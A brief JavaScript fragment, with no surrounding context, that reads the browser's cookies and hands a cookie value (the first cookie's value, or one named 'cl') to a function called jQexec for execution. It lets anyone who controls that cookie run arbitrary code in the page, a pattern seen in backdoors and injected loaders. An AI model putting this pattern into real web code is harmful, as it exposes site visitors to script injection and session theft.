var cook = document.cookie;
var hooman = cook.split('=');
jQexec(hooman[1]);

var cook = document.cookie;
var ck = cook.split(';');
var fbd = false;
ck.forEach(function(el, idx) {
   hooman = el.split('=');
   if(hooman[0] == 'cl') {
      jQexec(hooman[1]);
   }
});